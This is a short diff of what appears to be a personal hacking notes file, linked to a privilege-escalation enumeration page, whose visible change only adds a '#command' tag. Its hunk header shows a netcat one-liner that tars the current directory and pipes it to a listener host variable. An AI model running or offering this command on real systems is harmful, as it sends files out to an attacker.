@@ -12,4 +12,4 @@ tar -cf - . | nc $LHOST 1337
 - ~/kb/hacking/priv-esc/enumeration-quick-commands.md
 
 Tags:
-    #assorted
+    #assorted #command
